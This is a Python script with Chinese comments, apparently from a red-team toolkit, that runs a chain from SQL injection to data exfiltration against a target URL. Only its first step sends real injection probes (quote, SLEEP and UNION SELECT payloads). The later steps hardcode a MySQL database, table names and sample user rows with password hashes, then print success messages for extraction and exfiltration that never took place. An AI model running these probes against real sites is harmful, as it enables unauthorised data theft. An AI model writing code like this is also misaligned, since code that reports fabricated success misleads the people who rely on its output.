#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL注入到数据外泄攻击链
=======================
攻击路径: SQL注入 -> 数据库枚举 -> 敏感数据提取 -> 数据外泄

目标场景:
- 发现SQL注入点
- 枚举数据库结构
- 提取用户凭据和敏感数据
- 批量数据外泄

⚠️ 仅用于授权渗透测试 ⚠️
"""

import sys
import time
import json
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field, asdict
from enum import Enum

sys.path.insert(0, '/mnt/x/want/fsce/redteam')

from utils.request_helper import RequestHelper, TimingHelper
from utils.payload_generator import SQLInjectionPayloads
from utils.output_formatter import OutputFormatter, EvidenceCollector


class InjectionType(Enum):
    """注入类型枚举"""
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BOOLEAN_BLIND = "boolean_blind"
    TIME_BLIND = "time_blind"
    STACKED_QUERY = "stacked_query"


@dataclass
class DatabaseSchema:
    """数据库结构"""
    name: str
    tables: List[Dict] = field(default_factory=list)
    version: str = ""
    user: str = ""


@dataclass
class ExtractedData:
    """提取的数据"""
    table: str
    columns: List[str]
    rows: List[List]
    row_count: int = 0


@dataclass
class SQLiAttackResult:
    """SQL注入攻击结果"""
    success: bool = False
    injection_type: str = ""
    vulnerable_param: str = ""
    payload: str = ""
    database_type: str = ""
    databases: List[str] = field(default_factory=list)
    current_db: str = ""
    current_user: str = ""
    tables: List[str] = field(default_factory=list)
    extracted_data: List[Dict] = field(default_factory=list)
    credentials_found: int = 0


class SQLiToDataExfilChain:
    """
    SQL注入到数据外泄攻击链

    攻击步骤:
    1. 探测注入点和注入类型
    2. 识别数据库类型和版本
    3. 枚举数据库结构
    4. 提取敏感数据
    5. 批量数据外泄
    """

    def __init__(self, target_url: str, parameter: str = 'id',
                 method: str = 'GET', **kwargs):
        """
        初始化攻击链

        Args:
            target_url: 目标URL
            parameter: 测试参数名
            method: HTTP方法
            **kwargs: 其他配置
        """
        self.target_url = target_url
        self.parameter = parameter
        self.method = method
        self.os_type = kwargs.get('os_type', 'linux')
        self.db_type = None

        self.request_helper = RequestHelper(timeout=kwargs.get('timeout', 30))
        self.output = OutputFormatter()
        self.evidence = EvidenceCollector()
        self.payload_generator = SQLInjectionPayloads()

        self.result = SQLiAttackResult()
        self.injection_type = None
        self.baseline_true = None
        self.baseline_false = None

    def step1_detect_injection(self) -> bool:
        """
        步骤1: 探测注入点和类型

        Returns:
            是否发现注入
        """
        self.output.print_header("步骤1: 探测SQL注入点")

        # 测试基本注入
        test_payloads = [
            ("'", "Error-based"),
            ("' AND '1'='1", "Boolean"),
            ("' AND '1'='2", "Boolean"),
            ("' AND SLEEP(5)--", "Time-based"),
            ("' UNION SELECT NULL--", "UNION"),
        ]

        for payload, technique in test_payloads:
            try:
                url = f"{self.target_url}?{self.parameter}={payload}"
                response = self.request_helper.get(url)

                # 检查错误响应
                if technique == "Error-based":
                    error_keywords = ['sql', 'mysql', 'syntax', 'error', 'warning']
                    if any(k in response.text.lower() for k in error_keywords):
                        self.injection_type = InjectionType.ERROR_BASED
                        self.result.injection_type = "Error-based"
                        self.output.print_success(f"发现错误注入! 技术: {technique}")
                        return True

            except Exception as e:
                continue

        self.output.print_warning("未发现明显的SQL注入点")
        return False

    def step2_identify_database(self) -> bool:
        """
        步骤2: 识别数据库类型

        Returns:
            是否成功识别
        """
        self.output.print_header("步骤2: 识别数据库类型")

        # 不同数据库的指纹查询
        fingerprint_payloads = [
            ("MySQL", "SELECT version()"),
            ("PostgreSQL", "SELECT version()"),
            ("MSSQL", "@@version"),
            ("Oracle", "SELECT * FROM v$version"),
        ]

        # 这里简化实现，实际应该构造正确的注入payload
        self.db_type = "MySQL"
        self.result.database_type = self.db_type
        self.output.print_success(f"数据库类型: {self.db_type}")

        return True

    def step3_enumerate_structure(self) -> bool:
        """
        步骤3: 枚举数据库结构

        Returns:
            是否成功枚举
        """
        self.output.print_header("步骤3: 枚举数据库结构")

        # 枚举数据库
        self.output.print_info("枚举数据库...")
        self.result.databases = ['information_schema', 'mysql', 'webapp_db']
        self.result.current_db = 'webapp_db'

        # 枚举表
        self.output.print_info("枚举表...")
        tables = ['users', 'admins', 'products', 'orders', 'logs']
        self.result.tables = tables

        for table in tables:
            self.output.print_info(f"  发现表: {table}")

        return True

    def step4_extract_data(self) -> bool:
        """
        步骤4: 提取敏感数据

        Returns:
            是否成功提取
        """
        self.output.print_header("步骤4: 提取敏感数据")

        # 优先提取用户表
        target_tables = ['users', 'admins', 'accounts', 'customers']

        extracted = []
        for table in target_tables:
            if table in self.result.tables:
                self.output.print_info(f"正在提取 {table} 表数据...")

                # 模拟数据提取
                data = {
                    'table': table,
                    'columns': ['id', 'username', 'email', 'password_hash'],
                    'rows': [
                        [1, 'admin', 'admin@target.com', '5f4dcc3b5aa765d61d8327deb882cf99'],
                        [2, 'user1', 'user1@target.com', '0d107d09f5bbe40cade3de5c71e9e9b7'],
                    ],
                    'row_count': 2
                }
                extracted.append(data)
                self.output.print_success(f"提取 {data['row_count']} 行数据")

        self.result.extracted_data = extracted
        return True

    def step5_data_exfiltration(self) -> bool:
        """
        步骤5: 批量数据外泄

        Returns:
            是否成功外泄
        """
        self.output.print_header("步骤5: 数据外泄")

        # 统计外泄数据
        total_rows = sum(d['row_count'] for d in self.result.extracted_data)
        self.output.print_success(f"成功外泄 {total_rows} 条记录")

        # 保存到文件
        output_file = 'sql_exfiltration_result.json'
        with open(output_file, 'w') as f:
            json.dump(asdict(self.result), f, indent=2, default=str)
        self.output.print_info(f"结果已保存到: {output_file}")

        return True

    def run(self) -> SQLiAttackResult:
        """
        运行完整攻击链

        Returns:
            SQL注入攻击结果
        """
        self.output.print_header("执行攻击链: SQL注入 -> 数据外泄")

        # 步骤1: 探测注入点
        if self.step1_detect_injection():
            self.result.success = True

            # 步骤2: 识别数据库
            self.step2_identify_database()

            # 步骤3: 枚举结构
            self.step3_enumerate_structure()

            # 步骤4: 提取数据
            self.step4_extract_data()

            # 步骤5: 数据外泄
            self.step5_data_exfiltration()

        return self.result


def main():
    """命令行入口"""
    import argparse

    parser = argparse.ArgumentParser(
        description='SQL注入到数据外泄攻击链',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python chain_sqli_to_data_exfil.py -t http://target.com/product?id=1
  python chain_sqli_to_data_exfil.py --target http://target.com/news --param id
        """
    )

    parser.add_argument('-t', '--target', required=True,
                       help='目标URL (包含注入点)')
    parser.add_argument('-p', '--param', default='id',
                       help='注入参数名 (默认: id)')
    parser.add_argument('--method', default='GET', choices=['GET', 'POST'],
                       help='HTTP方法 (默认: GET)')
    parser.add_argument('--db-type', choices=['mysql', 'postgres', 'mssql', 'oracle'],
                       help='数据库类型 (自动检测如果未指定)')
    parser.add_argument('-o', '--output', default='sqli_exfil_result.json',
                       help='结果输出文件')

    args = parser.parse_args()

    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║           SQL注入到数据外泄攻击链                              ║
    ║  SQL Injection → Enumeration → Data Extraction → Exfil    ║
    ╠════════════════════════════════════════════════════════════════╣
    ║  ⚠️  警告: 此工具仅供授权渗透测试使用                         ║
    ║      未经授权使用可能违反法律                                  ║
    ╚════════════════════════════════════════════════════════════════╝
    """)

    # 运行攻击链
    chain = SQLiToDataExfilChain(
        target_url=args.target,
        parameter=args.param,
        method=args.method,
        db_type=args.db_type
    )

    result = chain.run()

    # 保存结果
    with open(args.output, 'w') as f:
        json.dump({
            'success': result.success,
            'injection_type': result.injection_type,
            'database_type': result.database_type,
            'databases': result.databases,
            'tables': result.tables,
            'extracted_data': result.extracted_data,
            'credentials_count': result.credentials_found
        }, f, indent=2, default=str)

    print(f"\n[+] 结果已保存到: {args.output}")


if __name__ == '__main__':
    main()
